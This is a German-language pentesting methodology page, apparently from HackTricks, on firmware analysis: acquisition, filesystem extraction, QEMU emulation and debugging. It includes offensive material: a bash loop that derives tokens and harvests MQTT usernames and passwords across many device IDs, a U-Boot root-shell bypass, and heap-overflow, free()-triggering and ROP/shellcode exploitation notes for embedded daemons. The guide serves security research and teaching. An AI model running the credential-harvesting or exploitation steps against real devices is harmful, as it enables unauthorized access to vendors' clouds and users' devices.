# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Einführung**

### Verwandte Ressourcen

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ist essenzielle Software, die den korrekten Betrieb von Geräten ermöglicht, indem sie die Kommunikation zwischen den Hardwarekomponenten und der Software verwaltet und erleichtert, mit der Benutzer interagieren. Sie wird in einem permanenten Speicher abgelegt, sodass das Gerät vom Einschalten an auf wichtige Anweisungen zugreifen kann, was schließlich zum Start des Betriebssystems führt. Die Untersuchung und mögliche Modifizierung von Firmware ist ein entscheidender Schritt, um Sicherheitslücken zu identifizieren.<sup>[[2]](#references)[[3]](#references)</sup>

## **Informationen sammeln**

Das **Sammeln von Informationen** ist ein entscheidender erster Schritt, um die Zusammensetzung eines Geräts und die verwendeten Technologien zu verstehen. Dabei werden Daten zu folgenden Punkten gesammelt:

- Der CPU-Architektur und dem darauf ausgeführten Betriebssystem
- Details zum Bootloader
- Hardware-Layout und Datenblättern
- Codebasis-Metriken und Quellcodepfaden
- Externen Bibliotheken und Lizenztypen
- Update-Verläufen und behördlichen Zertifizierungen
- Architektur- und Ablaufdiagrammen
- Sicherheitsbewertungen und identifizierten Schwachstellen

Für diesen Zweck sind Tools für **Open-Source-Intelligence (OSINT)** unverzichtbar, ebenso wie die manuelle und automatisierte Analyse verfügbarer Open-Source-Softwarekomponenten. Tools wie [Coverity Scan](https://scan.coverity.com) und [Semmle’s LGTM](https://lgtm.com/#explore) bieten kostenlose statische Analysen, mit denen sich potenzielle Probleme finden lassen.

## **Firmware beschaffen**

Firmware lässt sich auf verschiedene Arten beschaffen, die jeweils unterschiedlich komplex sind:

- **Direkt** von der Quelle (Entwicklern, Herstellern)
- Durch **Erstellen** anhand bereitgestellter Anweisungen
- Durch **Herunterladen** von offiziellen Support-Websites
- Mithilfe von **Google-dork**-Suchanfragen, um gehostete Firmware-Dateien zu finden
- Durch direkten Zugriff auf **Cloud-Speicher**, etwa mit Tools wie [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Durch Abfangen von **Updates** mithilfe von Man-in-the-Middle-Techniken
- Durch **Extrahieren** vom Gerät über Schnittstellen wie **UART**, **JTAG** oder **PICit**
- Durch **Mitschnitt** von Update-Anfragen innerhalb der Gerätekommunikation
- Durch Identifizieren und Verwenden von **fest codierten Update-Endpunkten**
- Durch **Dumpen** aus dem Bootloader oder über das Netzwerk
- Durch **Entfernen und Auslesen** des Speicherchips mit geeigneten Hardware-Tools, wenn alle anderen Möglichkeiten ausgeschöpft sind

### Nur UART-Protokolle: Eine Root-Shell über die U-Boot-Umgebung im Flash erzwingen

Wenn UART RX ignoriert wird (nur Protokollausgaben), kann man dennoch eine Init-Shell erzwingen, indem man **den U-Boot-Umgebungs-Blob offline bearbeitet**:<sup>[[6]](#references)</sup>

1. Den SPI-Flash mithilfe eines SOIC-8-Clips und eines Programmiergeräts (3,3 V) auslesen:
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Finde die U-Boot-env-Partition, bearbeite `bootargs`, sodass `init=/bin/sh` enthalten ist, und **berechne die U-Boot-env-CRC32 für den Blob neu**.
3. Flash nur die env-Partition erneut und starte das Gerät neu; auf UART sollte eine Shell erscheinen.

Das ist nützlich bei Embedded-Geräten, bei denen die Bootloader-Shell deaktiviert ist, aber über externen Flash-Zugriff auf die env-Partition geschrieben werden kann.

## Analyse der Firmware

Nachdem du jetzt **die Firmware hast**, musst du Informationen darüber extrahieren, um zu wissen, wie du sie behandeln sollst. Dafür kannst du verschiedene Tools verwenden:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Wenn du mit diesen Tools nicht viel findest, überprüfe die **Entropie** des Images mit `binwalk -E <bin>`. Bei niedriger Entropie ist es wahrscheinlich nicht verschlüsselt. Bei hoher Entropie ist es wahrscheinlich verschlüsselt (oder auf irgendeine Weise komprimiert).

Außerdem kannst du mit diesen Tools **in der Firmware eingebettete Dateien** extrahieren:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oder verwende [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)), um die Datei zu untersuchen.

### Das Dateisystem abrufen

Mit den zuvor erwähnten Tools wie `binwalk -ev <bin>` solltest du das **Dateisystem extrahiert** haben.\
Binwalk extrahiert es normalerweise in einen **Ordner, der nach dem Dateisystemtyp benannt ist**. Das ist meist einer der folgenden: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manuelle Dateisystemextraktion

Manchmal enthält binwalk **die Magic Bytes des Dateisystems nicht in seinen Signaturen**. Verwende in solchen Fällen binwalk, um den **Offset des Dateisystems zu finden und das komprimierte Dateisystem** aus der Binärdatei auszuschneiden, und **extrahiere** das Dateisystem dann manuell entsprechend seinem Typ anhand der folgenden Schritte.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Führen Sie den folgenden **dd-Befehl** aus, um das Squashfs-Dateisystem zu extrahieren.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativ kann auch der folgende Befehl ausgeführt werden.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Für squashfs (wie im obigen Beispiel verwendet)

`$ unsquashfs dir.squashfs`

Die Dateien befinden sich anschließend im Verzeichnis "`squashfs-root`".

- CPIO-Archivdateien

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Für jffs2-Dateisysteme

`$ jefferson rootfsfile.jffs2`

- Für ubifs-Dateisysteme mit NAND-Flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware analysieren

Sobald die Firmware vorliegt, muss sie unbedingt untersucht werden, um ihre Struktur und potenzielle Schwachstellen zu verstehen. Dazu werden verschiedene Tools eingesetzt, um das Firmware-Image zu analysieren und wertvolle Daten daraus zu extrahieren.

### Tools für die erste Analyse

Für die erste Untersuchung der Binärdatei (bezeichnet als `<bin>`) stehen verschiedene Befehle zur Verfügung. Sie helfen dabei, Dateitypen zu identifizieren, Zeichenfolgen zu extrahieren, Binärdaten zu analysieren und Details zu Partitionen und Dateisystemen zu ermitteln:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Um den Verschlüsselungsstatus des Images zu beurteilen, wird die **Entropie** mit `binwalk -E <bin>` geprüft. Eine niedrige Entropie deutet darauf hin, dass keine Verschlüsselung vorliegt, während eine hohe Entropie auf mögliche Verschlüsselung oder Komprimierung hinweist.

Zum Extrahieren **eingebetteter Dateien** werden Tools und Ressourcen wie die Dokumentation **file-data-carving-recovery-tools** und **binvis.io** zur Dateiprüfung empfohlen.

### Extrahieren des Dateisystems

Mit `binwalk -ev <bin>` lässt sich das Dateisystem in der Regel extrahieren, oft in ein Verzeichnis, das nach dem Dateisystemtyp benannt ist (z. B. squashfs, ubifs). Wenn **binwalk** den Dateisystemtyp jedoch aufgrund fehlender Magic Bytes nicht erkennt, ist eine manuelle Extraktion erforderlich. Dazu wird mit `binwalk` der Offset des Dateisystems ermittelt und anschließend mit dem Befehl `dd` das Dateisystem herausgeschnitten:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Anschließend werden je nach Dateisystemtyp (z. B. squashfs, cpio, jffs2, ubifs) unterschiedliche Befehle verwendet, um die Inhalte manuell zu extrahieren.

### Dateisystemanalyse

Sobald das Dateisystem extrahiert wurde, beginnt die Suche nach Sicherheitslücken. Dabei wird auf unsichere Netzwerk-Daemons, fest codierte Zugangsdaten, API-Endpunkte, Funktionen des Update-Servers, nicht kompilierten Code, Startskripte und kompilierte Binärdateien zur Offline-Analyse geachtet.

Zu den **wichtigen Speicherorten** und **Elementen**, die untersucht werden sollten, gehören:

- **etc/shadow** und **etc/passwd** auf Zugangsdaten von Benutzern
- SSL-Zertifikate und Schlüssel in **etc/ssl**
- Konfigurations- und Skriptdateien auf potenzielle Sicherheitslücken
- Eingebettete Binärdateien zur weiteren Analyse
- Gängige Webserver und Binärdateien von IoT-Geräten

Verschiedene Tools helfen dabei, sensible Informationen und Sicherheitslücken im Dateisystem aufzudecken:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) und [**Firmwalker**](https://github.com/craigz28/firmwalker) zur Suche nach sensiblen Informationen
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) für umfassende Firmware-Analysen
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) und [**EMBA**](https://github.com/e-m-b-a/emba) für statische und dynamische Analysen

### Sicherheitsprüfungen für kompilierte Binärdateien

Sowohl der Quellcode als auch die im Dateisystem gefundenen kompilierten Binärdateien müssen auf Sicherheitslücken untersucht werden. Tools wie **checksec.sh** für Unix-Binärdateien und **PESecurity** für Windows-Binärdateien helfen dabei, ungeschützte Binärdateien zu identifizieren, die ausgenutzt werden könnten.

## Cloud-Konfiguration und MQTT-Zugangsdaten über abgeleitete URL-Tokens sammeln

Viele IoT-Hubs rufen die Konfiguration für ein Gerät von einem Cloud-Endpunkt ab, der etwa so aussieht:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Bei der Firmware-Analyse kann sich herausstellen, dass `<token>` lokal aus der Geräte-ID und einem fest codierten geheimen Schlüssel abgeleitet wird, zum Beispiel:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Mit diesem Design kann jeder, der eine deviceId und den STATIC_KEY kennt, die URL rekonstruieren und die Cloud-Konfiguration abrufen. Diese enthält oft MQTT-Zugangsdaten im Klartext und Topic-Präfixe.

Praktischer Ablauf:

1) deviceId aus UART-Bootprotokollen extrahieren

- Einen 3.3V-UART-Adapter (TX/RX/GND) anschließen und Protokolle aufzeichnen:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Suchen Sie nach Zeilen, die das Cloud-Konfigurations-URL-Muster und die Broker-Adresse ausgeben, zum Beispiel:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) STATIC_KEY und Token-Algorithmus aus der Firmware wiederherstellen

- Lade die Binärdateien in Ghidra/radare2 und suche nach dem Konfigurationspfad ("/pf/") oder nach MD5-Verwendung.
- Bestätige den Algorithmus (z. B. MD5(deviceId||STATIC_KEY)).
- Leite den Token in Bash ab und wandle den Digest in Großbuchstaben um:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Cloud-Konfiguration und MQTT-Zugangsdaten sammeln

- URL zusammensetzen und JSON mit curl abrufen; mit jq parsen, um Geheimnisse zu extrahieren:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Unverschlüsseltes MQTT und schwache Topic-ACLs ausnutzen (falls vorhanden)

- Mit wiederhergestellten Zugangsdaten Wartungsthemen abonnieren und nach sensiblen Ereignissen suchen:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Vorhersehbare Geräte-IDs aufzählen (im großen Maßstab, mit Genehmigung)

- Viele Ökosysteme enthalten Bytes für Hersteller-OUI/Produkt/Typ, gefolgt von einem sequenziellen Suffix.
- Du kannst mögliche IDs durchprobieren, Tokens ableiten und Konfigurationen programmgesteuert abrufen:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Hinweise
- Hole immer eine ausdrückliche Genehmigung ein, bevor du eine Mass Enumeration versuchst.
- Bevorzuge Emulation oder statische Analyse, um Secrets nach Möglichkeit wiederherzustellen, ohne die Zielhardware zu verändern.


Die Emulation von Firmware ermöglicht eine **dynamische Analyse** des Betriebs eines Geräts oder eines einzelnen Programms. Dieser Ansatz kann aufgrund von Hardware- oder Architekturabhängigkeiten auf Herausforderungen stoßen. Das Übertragen des Root-Dateisystems oder bestimmter Binärdateien auf ein Gerät mit passender Architektur und Endianness, etwa einen Raspberry Pi, oder auf eine vorgefertigte virtuelle Maschine kann jedoch weitere Tests ermöglichen.

### Einzelne Binärdateien emulieren

Bei der Untersuchung einzelner Programme ist es entscheidend, die Endianness und die CPU-Architektur des Programms zu ermitteln.

#### Beispiel mit MIPS-Architektur

Um eine Binärdatei für eine MIPS-Architektur zu emulieren, kann man folgenden Befehl verwenden:

```bash
file ./squashfs-root/bin/busybox
```

Und um die erforderlichen Emulationstools zu installieren:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Für MIPS (Big-Endian) wird `qemu-mips` verwendet; für Little-Endian-Binärdateien ist `qemu-mipsel` die richtige Wahl.

#### Emulation der ARM-Architektur

Bei ARM-Binärdateien läuft der Prozess ähnlich ab: Für die Emulation wird der Emulator `qemu-arm` verwendet.

### Vollständige Systememulation

Tools wie [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) und andere ermöglichen die vollständige Firmware-Emulation. Sie automatisieren den Prozess und unterstützen die dynamische Analyse.

### Rekonstruktion aufgeteilter und verifizierter Root-Dateisysteme für die Emulation

Wenn ein SquashFS-Superblock lesbar ist, die Offsets der Inode-, Verzeichnis- oder Fragmenttabellen jedoch unmöglich erscheinen, sollte `unsquashfs` nicht sofort gepatcht werden. Analysieren Sie stattdessen die frühe Boot-Binärdatei rückwärts und rekonstruieren Sie den Blockgerätegraphen, den sie erstellt: Eingebettete Systeme können eine nominelle Root-Partition bereitstellen, das tatsächliche Dateisystem jedoch mit einem `dm-linear`-Mapping erstellen, das Sektoren aus einer anderen Partition anhängt. Prüfungen, die nur den Superblock berücksichtigen, können erfolgreich sein, obwohl alle nachfolgenden Metadatenblöcke verschoben sind.<sup>[[9]](#references)</sup>

Übernehmen Sie die Arithmetik der Firmware exakt. Ermitteln Sie insbesondere, ob Längen in Bytes, 512-Byte-Sektoren oder 4-KiB-Seiten angegeben sind; bilden Sie Verschiebungen und Abschneidungen in ihrer ursprünglichen Reihenfolge nach; und berücksichtigen Sie in A/B-Layouts bankabhängige Endbereiche. Beispielsweise schneidet `(partition_bytes >> 12) << 3` zunächst auf eine 4-KiB-Grenze ab und gibt das Ergebnis erst danach in 512-Byte-Sektoren an. Wird dies durch `partition_bytes // 512` ersetzt, kann sich der angehängte Bereich um einige Kilobytes verschieben und alle nachfolgenden SquashFS-Tabellen beschädigen.<sup>[[9]](#references)</sup>

Ein sinnvoller Validierungsablauf ist:<sup>[[9]](#references)</sup>

1. Ermitteln Sie aus der Verifier-/Init-Binärdatei für jedes `dm-linear`-Segment das Quellgerät, den Startsektor und die Länge.
2. Verketten Sie die Bereiche oder ordnen Sie sie zu, ohne ihre Ausrichtungssemantik zu verändern.
3. Falls die Extraktion weiterhin fehlschlägt, durchsuchen Sie nur einen kleinen Bereich um die vorhergesagte Grenze und verlangen Sie mehrere aufeinanderfolgende gültige Metadatenstrukturen, statt einen plausiblen Superblock allein als ausreichend anzusehen.
4. Führen Sie ein unverändertes `unsquashfs` für das rekonstruierte Image aus. Die erfolgreiche Verarbeitung aller Verzeichnisse und Fragmente ist ein stärkerer Beleg als `unsquashfs -stat`.

#### Vom Analysten kontrollierter dm-verity-Ersatz

Wenn der Analyst den QEMU-Kernel, das Initramfs und die virtuellen Datenträger kontrolliert, kann ein modifiziertes Root-Dateisystem gebootet werden, indem die Verifizierungs-PID 1 des Herstellers durch ein kleines, statisch gelinktes Init ersetzt wird. Dies ist eine **Ersetzung der Boot-Kette im Labor**, kein Bruch von dm-verity, dessen RSA-Signatur, Secure Boot oder einem TPM-versiegelten Schlüssel.<sup>[[9]](#references)</sup>

Das Ersatz-Init sollte die wesentlichen Schritte des ursprünglichen Boot-Pfads nachbilden: `devtmpfs` einhängen, `setsid()` aufrufen, `/dev/console` mit den Dateideskriptoren 0–2 verbinden, `/proc` und `/sys` einhängen, auf das bereitgestellte Blockgerät warten, das bearbeitete Root-Dateisystem schreibgeschützt einhängen, die Pseudo-Dateisysteme des alten Root-Dateisystems aushängen, den neuen Mount auf `/` verschieben, `chroot` ausführen und das ursprüngliche `/sbin/init` der Firmware mit `execve()` starten. Werden `/dev`, `/proc` und `/sys` **vor** `MS_MOVE` ausgehängt, wird vermieden, dass versehentlich Mount-Punkte des neuen Root-Dateisystems ausgehängt werden.<sup>[[9]](#references)</sup>

Halten Sie den veränderlichen Gerätezustand getrennt vom modifizierten, unveränderlichen Root-Dateisystem. Ein qcow2-Overlay kann den LVM-Zustand des ursprünglichen Datenträgers erhalten, während ein zweiter schreibgeschützter virtio-Datenträger das bearbeitete SquashFS bereitstellt:<sup>[[9]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Debugging des Image-Zustands im Offline-Modus

Untersuche den persistenten Zustand außerhalb des Guest-Systems, wenn langsame Bootvorgänge, destruktive Startskripte oder unzuverlässige Konsolenprotokolle die Fehlersuche erschweren. Binde niemals ein Overlay ein, das von einer laufenden VM verwendet wird; stelle es mit `qemu-nbd` bereit, beschränke die LVM-Erkennung auf die vorgesehene NBD-Partition und deaktiviere die Volume Group, bevor du die Verbindung trennst.<sup>[[9]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Für eine reproduzierbare Fehlerisolierung sollten zeitgestempelte Markerdateien auf einem stabilen, beschreibbaren Volume gespeichert und offline überprüft werden; `/dev/kmsg`, FIFOs und flüchtige Konsolen können durch Rate-Limiting oder einen vorzeitigen Prozessabbruch zu falsch-negativen Ergebnissen führen. Vergleichen Sie außerdem die exakten Schnittstellen über die verschiedenen Ebenen hinweg, bevor Sie nicht zusammenhängenden Code ändern: `uname -r` mit `/lib/modules/`, ext4-Features auf dem Datenträger mit der Kernel-Konfiguration und die Mesa-`libGL`-Generation mit der DRI-Treiber-ABI und den aus der PCI-ID abgeleiteten Treibernamen. Eine Komponente kann vorhanden sein und sogar erfolgreich mit `dlopen()` geladen werden, aber dennoch unbrauchbar bleiben, weil ihr Consumer eine andere ABI erwartet.<sup>[[9]](#references)</sup>

## Dynamische Analyse in der Praxis

In dieser Phase wird für die Analyse entweder eine echte oder eine emulierte Geräteumgebung verwendet. Es ist unerlässlich, Shell-Zugriff auf das Betriebssystem und das Dateisystem zu behalten. Eine Emulation bildet Hardwareinteraktionen möglicherweise nicht perfekt nach, sodass gelegentliche Neustarts der Emulation erforderlich sind. Bei der Analyse sollten das Dateisystem erneut untersucht, exponierte Webseiten und Netzwerkdienste exploitet sowie Bootloader-Schwachstellen erforscht werden. Tests der Firmware-Integrität sind entscheidend, um potenzielle Backdoor-Schwachstellen zu identifizieren.

## Laufzeitanalysetechniken

Bei der Laufzeitanalyse wird mit einem Prozess oder einer Binärdatei in ihrer Betriebsumgebung interagiert. Dazu werden Tools wie gdb-multiarch, Frida und Ghidra verwendet, um Breakpoints zu setzen und mithilfe von Fuzzing und anderen Techniken Schwachstellen zu identifizieren.

Bei Embedded-Zielen ohne vollständigen Debugger **kopieren Sie ein statisch gelinktes `gdbserver`** auf das Gerät und verbinden Sie sich remote:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee-/Radio-Co-Prozessor-Nachrichtenmapping

Bei IoT-Hubs ist der RF-Stack häufig zwischen einem **Radio-MCU** und einem Linux-Userland-Prozess aufgeteilt. Ein nützlicher Workflow ist es, den Pfad abzubilden:<sup>[[8]](#references)</sup>

1. **RF-Frame** über Funk
2. **Controller-seitiger Parser** auf dem Radio-MCU
3. **Serielles/UART-Text- oder TLV-Protokoll**, das an Linux weitergeleitet wird (zum Beispiel `/dev/tty*`)
4. **Application Dispatcher** im Haupt-Daemon
5. **Protokollspezifischer Handler / State Machine**

Diese Architektur bietet zwei Reverse-Engineering-Ziele statt einem. Wenn der Controller binäre Funk-Frames in ein Textprotokoll wie `Group,Command,arg1,arg2,...` umwandelt, ermittle:

- Die **Nachrichtengruppen** und Dispatch-Tabellen
- Welche Nachrichten aus dem **Netzwerk** kommen können und welche vom Controller selbst
- Die genauen **herstellerspezifischen Unterscheidungsfelder** (zum Beispiel Zigbee-`manufacturer_code` und benutzerdefiniertes `cluster_command`)
- Welche Handler nur während **Commissioning**, Discovery oder Firmware-/Modell-Download-Phasen erreichbar sind

Prüfe bei Zigbee insbesondere den Pairing-Datenverkehr und ob das Zielgerät noch den standardmäßigen **Link Key** `ZigBeeAlliance09` verwendet. Falls ja, kann das Mitschneiden des Commissioning-Datenverkehrs den **Network Key** offenlegen. Zigbee-3.0-Installationscodes verringern dieses Risiko; halte also fest, ob das getestete Gerät sie tatsächlich erzwingt.

### Herstellerspezifische Protokoll-Handler und durch FSM begrenzte Erreichbarkeit

Herstellerspezifische Zigbee-/ZCL-Befehle sind oft ein besseres Ziel als standardisierte Cluster, da sie **benutzerdefinierten Parsing-Code** und interne **FSMs** mit weniger erprobter Validierung durchlaufen.<sup>[[8]](#references)</sup>

Praktischer Workflow:

- Kehre den Command Dispatcher um, bis du den **nur für den Hersteller vorgesehenen Handler** findest.
- Ermittle die Tabellen für **FSM-Zustand**, **Ereignis**, **Prüfung**, **Aktion** und **Folgezustand**.
- Identifiziere **Übergangszustände**, die automatisch weiterlaufen, sowie Retry-/Error-Zweige, die schließlich vom Angreifer kontrollierten Zustand zurücksetzen oder freigeben.
- Stelle fest, welche legitimen Protokollaustausche erforderlich sind, um den Daemon in den verwundbaren Zustand zu versetzen, statt anzunehmen, dass der fehlerhafte Handler immer erreichbar ist.

Bei zeitkritischen Protokollen kann die Paketwiedergabe über ein Python-Framework zu langsam sein. Zuverlässiger ist es, ein legitimes Gerät auf echter Hardware (zum Beispiel einem **nRF52840**) mit einem herstellertauglichen Stack zu emulieren, damit die richtigen **Endpoints**, **Attributes** und das richtige Commissioning-Timing verwendet werden.

### Fehlerklasse: fragmentierte Downloads in eingebetteten Daemons

Eine wiederkehrende Firmware-Fehlerklasse tritt bei **fragmentierten Blob-/Modell-/Konfigurationsdownloads** auf:<sup>[[8]](#references)</sup>

1. Das **erste Fragment** (`offset == 0`) speichert `ctx->total_size` und allokiert `malloc(total_size)`.
2. Spätere Fragmente validieren nur die vom Angreifer kontrollierten **paketlokalen** Felder, etwa `packet_total_size >= offset + chunk_len`.
3. Der Kopiervorgang verwendet `memcpy(&ctx->buffer[offset], chunk, chunk_len)`, ohne die **ursprünglich allokierte Größe** zu prüfen.

Dadurch kann ein Angreifer Folgendes senden:

- Ein erstes gültiges Fragment mit einer **kleinen** angegebenen Gesamtgröße, um eine kleine Heap-Allokation zu erzwingen.
- Ein späteres Fragment mit dem **erwarteten Offset**, aber einem größeren `chunk_len`.
- Eine gefälschte paketlokale Größe, die die erneuten Prüfungen besteht und trotzdem den ursprünglich allokierten Buffer überlaufen lässt.

Wenn der verwundbare Pfad hinter der Commissioning-Logik liegt, muss der Exploit ausreichend **Geräteemulation** enthalten, um das Ziel vor dem Senden der fehlerhaften Fragmente in den erwarteten Modell-Download- oder Blob-Download-Zustand zu versetzen.

### Durch das Protokoll ausgelöste `free()`-Aufrufe

Bei eingebetteten Daemons lässt sich Heap-Metadaten-Exploitation oft am einfachsten nicht durch „auf die Bereinigung warten“, sondern durch **Auslösen der protokolleigenen Fehlerbehandlung** erreichen:<sup>[[8]](#references)</sup>

- Sende fehlerhafte Folgefragmente, um die FSM in **Retry**- oder **Error**-Zustände zu versetzen.
- Überschreite den Retry-Schwellenwert, damit der Daemon den **Kontext zurücksetzt** und den beschädigten Buffer freigibt.
- Nutze dieses vorhersagbare `free()`, um allocatorseitige Primitives auszulösen, bevor der Prozess aus anderen Gründen abstürzt.

Das ist besonders nützlich bei **musl-/uClibc-/dlmalloc-ähnlichen** Allokatoren in Embedded Linux, wo sich Chunk-Metadaten so beschädigen lassen, dass Unlink-/Unbin-Logik zu einem Schreib-Primitive wird. Ein stabiles Muster besteht darin, ein **Size-Feld** zu beschädigen, um die Traversierung des Allokators auf **gefälschte Chunks innerhalb des übergelaufenen Buffers** umzulenken, statt sofort echte Bin-Pointer zu überschreiben und den Prozess zum Absturz zu bringen.

## Binäre Exploitation und Proof of Concept

Die Entwicklung eines PoC für erkannte Schwachstellen erfordert ein tiefes Verständnis der Zielarchitektur und Programmierkenntnisse in Low-Level-Sprachen. Binäre Laufzeitschutzmaßnahmen sind in eingebetteten Systemen selten, können aber, falls vorhanden, Techniken wie Return Oriented Programming (ROP) erforderlich machen.

### Hinweise zur uClibc-Fastbin-Exploitation (Embedded Linux)

- **Fastbins + Konsolidierung:** uClibc verwendet Fastbins ähnlich wie glibc. Eine spätere große Allokation kann `__malloc_consolidate()` auslösen, daher muss jeder gefälschte Chunk Prüfungen bestehen (plausible Größe, `fd = 0` und benachbarte Chunks müssen als „in use“ gelten).<sup>[[6]](#references)</sup>
- **Nicht-PIE-Binaries unter ASLR:** Wenn ASLR aktiviert ist, das Haupt-Binary aber **non-PIE** ist, sind Adressen innerhalb des Binaries in `.data/.bss` stabil. Du kannst einen Bereich anvisieren, der bereits wie ein gültiger Heap-Chunk-Header aussieht, um eine Fastbin-Allokation auf einer **Function-Pointer-Tabelle** zu platzieren.
- **NUL-Zeichen zum Stoppen des Parsers:** Beim Parsen von JSON kann ein `\x00` in der Payload das Parsing beenden und zugleich nachfolgende, vom Angreifer kontrollierte Bytes für einen Stack Pivot bzw. eine ROP-Chain erhalten.
- **Shellcode über `/proc/self/mem`:** Eine ROP-Chain, die `open("/proc/self/mem")`, `lseek()` und `write()` aufruft, kann ausführbaren Shellcode in einem bekannten Mapping platzieren und dorthin springen.

## Vorbereitete Betriebssysteme für Firmware-Analysen

Betriebssysteme wie [AttifyOS](https://github.com/adi0x90/attifyos) und [EmbedOS](https://github.com/scriptingxss/EmbedOS) bieten vorkonfigurierte Umgebungen für Firmware-Sicherheitstests, die mit den erforderlichen Tools ausgestattet sind.

## Vorbereitete Betriebssysteme zur Firmware-Analyse

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ist eine Distribution, die dich bei der Sicherheitsbewertung und beim Pentesting von Internet-of-Things-(IoT-)Geräten unterstützt. Sie spart viel Zeit, indem sie eine vorkonfigurierte Umgebung mit allen erforderlichen Tools bereitstellt.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Auf Ubuntu 18.04 basierendes Betriebssystem für Embedded-Security-Tests, das bereits mit Tools für Firmware-Sicherheitstests ausgestattet ist.

## Firmware-Downgrade-Angriffe und unsichere Update-Mechanismen

